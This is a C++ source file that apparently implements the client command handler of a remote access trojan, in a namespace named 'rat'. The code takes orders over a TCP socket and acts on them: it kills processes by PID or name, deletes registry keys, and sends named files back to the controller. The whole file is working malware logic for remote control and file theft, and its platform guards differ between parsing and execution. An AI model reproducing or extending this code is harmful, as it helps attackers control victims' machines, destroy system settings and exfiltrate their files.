#include "clientcmd.h"

namespace rat
{

ClientCmd::ClientCmd()
{
    SetType(-1);
}

ClientCmd::ClientCmd(const TcpSocket& socket, const char* input)
{
    HandleInput(input);
    SetSocket(socket);
}

void ClientCmd::HandleInput(const char* input)
{
    // Get address and port here in input;

    SetType(-1);
    if (int cmd_sz = *((int*)input); cmd_sz <= 8)
    {
        SetType(-1);
        return;
    }
    if (int type = *((int *)(input + 4)); type == static_cast<int>(rat::Command::CommandType::kClientKillPid))
    {
        SetType(static_cast<int>(rat::Command::CommandType::kClientKillPid));
    }
    else if (type == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
    {
        SetType(static_cast<int>(rat::Command::CommandType::kClientKillProcessName));
    }
    else if (type == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
    {
        SetType(static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry));
    }
    #ifdef _WIN32
    else if (type == static_cast<int>(rat::Command::CommandType::kClientSendFile))
    {
        SetType(static_cast<int>(rat::Command::CommandType::kClientSendFile));
    }
    #endif
    if (GetType() != -1)
    {
        SetArgument(input + 8);
    }
}

void ClientCmd::SetSocket(unsigned long long socket)
{
    socket_.SetSocket(socket);
}

void ClientCmd::SetSocket(const TcpSocket& socket)
{
    socket_ = socket;
}


bool ClientCmd::execute()
{
    if (GetType() == -1 || socket_.GetSocket() == INVALID_SOCKET || socket_.Disconnected()){
        return false;
    }
    if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
    {
        Process p(std::atoi(&GetArgument()[0]));
        return p.KillSelf();
    }
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
    {
        Process p(GetArgument());
        return p.KillSelf();
    }
    #ifdef _WIN32
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
    {
        std::string arg = GetArgument();
        std::stringstream ss(arg);
        std::string root_hkey_name;
        std::string sub_key_name;
        ss >> root_hkey_name;
        std::getline(ss, sub_key_name);
        Registry r(root_hkey_name, sub_key_name);
        return r.DeleteSelf();
    }
    #endif
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
    {
        auto f = File(GetArgument());
        if (f.Exists())
        {
            if (f.SendFileThroughSocket(socket_) != 0)
            {
                return false;
            }
            else return true;
        }
    }
    return false;
}

}